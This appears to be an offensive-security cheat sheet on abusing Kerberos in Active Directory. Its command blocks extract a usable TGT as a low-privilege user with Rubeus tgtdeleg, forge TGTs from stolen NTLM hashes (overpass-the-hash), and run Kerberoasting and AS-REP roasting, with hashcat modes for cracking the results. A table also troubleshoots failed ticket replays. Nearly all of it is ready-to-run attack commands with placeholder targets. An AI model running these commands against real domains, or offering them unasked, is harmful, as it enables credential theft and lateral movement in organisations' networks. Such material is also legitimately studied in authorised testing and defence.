# Kerberos Tickets & Keys

## The zero-session-key symptom
Tickets exported from LSASS by a **non-admin** user (no `SeDebugPrivilege`)
have an all-zero session key (`Key: (0x12) 00000000...`). They fail with
`KRB_AP_ERR_BAD_INTEGRITY` when replayed. This is a diagnosis, not a
retry-this-command situation.

## Fix: tgtdeleg (GSS-API / S4U2self trick)
Requests a fake-delegation TGT for the current user; the session key is
returned to the low-priv caller. No admin needed.
```cmd
rubeus.exe tgtdeleg /nowrap          :: base64 kirbi on stdout
```
```bash
echo <b64> | base64 -d > user.kirbi
impacket-ticketConverter user.kirbi user.ccache
# ALWAYS verify the key is non-zero before using the ccache:
impacket-describeTicket user.ccache
```

## Common Kerberos errors
| Error | Cause | Fix |
|---|---|---|
| `KRB_AP_ERR_BAD_INTEGRITY` | zero/wrong session key in ccache | re-mint via tgtdeleg or `impacket-getTGT` with password/hash |
| `KRB_ERR_C_PRINCIPAL_UNKNOWN` | account missing/disabled/tombstoned | check account state; restore tombstone with bloodyAD |
| `KRB_AP_ERR_TKT_EXPIRED` | stale ticket | re-mint with `impacket-getTGT` |
| `KRB_ERR_CLOCK_SKEW_TOO_GREAT` | host clock off from DC by >5min | `sudo ntpdate -b <DC>` or `faketime` |
| `PREAUTH_FAILED` | wrong password/hash or reverted account | re-validate cred over SMB first (`nxc smb`) |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN` | SPN doesn't exist for the target service | verify SPN with `nxc ldap -M spn_list` or use `cifs/` not `host/` |

## Ticket operations
```bash
# Get TGT from password
impacket-getTGT '<dom>/<user>:<pass>' -dc-ip <DC>
# Get TGT from NTLM hash (overpass-the-hash)
impacket-getTGT '<dom>/<user>' -hashes :<NTLM> -dc-ip <DC>
# Use a ccache everywhere
export KRB5CCNAME=/path/to/user.ccache
# Inspect a ticket
impacket-describeTicket user.ccache
# Convert kirbi <-> ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi
```

## Kerberoasting
```bash
# Find and request TGS for accounts with SPNs
impacket-GetUserSPNs '<dom>/<user>:<pass>' -dc-ip <DC> -request -outputfile kerberoast.hash
# Crack: hashcat -m 13100 kerberoast.hash wordlist.txt
```

## AS-REP Roasting
```bash
# Find accounts with no pre-auth required
impacket-GetNPUsers '<dom>/' -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.hash
# Crack: hashcat -m 18200 asrep.hash wordlist.txt
```

## After reboots
ccaches go stale, accounts may revert to tombstoned. Re-mint tickets rather
than debugging stale ones. Re-validate the credential chain from the start.
